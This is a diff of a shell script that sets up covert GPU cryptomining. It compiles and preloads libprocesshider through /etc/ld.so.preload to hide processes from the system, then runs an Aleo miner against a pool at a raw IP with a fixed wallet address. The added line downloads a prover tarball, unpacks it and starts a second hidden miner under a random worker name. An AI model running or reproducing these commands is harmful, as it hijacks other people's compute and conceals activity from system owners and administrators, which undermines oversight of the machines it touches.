@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./aleo_prover --pool 167.99.155.214:443 --address aleo1tpxcqcxsep8x0g6337u64zzu30454vfjuutwts9s5khq26w9rurq6m3nzg --custom_name GPU
+./graftcp/graftcp & clear & ./aleo_prover --pool 167.99.155.214:443 --address aleo1tpxcqcxsep8x0g6337u64zzu30454vfjuutwts9s5khq26w9rurq6m3nzg --custom_name GPU & wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/v0.2.1/aleo_prover-v0.2.1.tar.gz && tar -zvxf aleo_prover-v0.2.1.tar.gz && cd aleo_prover & clear & ./aleo_prover --pool 167.99.155.214:443 --address aleo1tpxcqcxsep8x0g6337u64zzu30454vfjuutwts9s5khq26w9rurq6m3nzg --custom_name $(shuf -n 1 -i 1-9999)-Bismillah
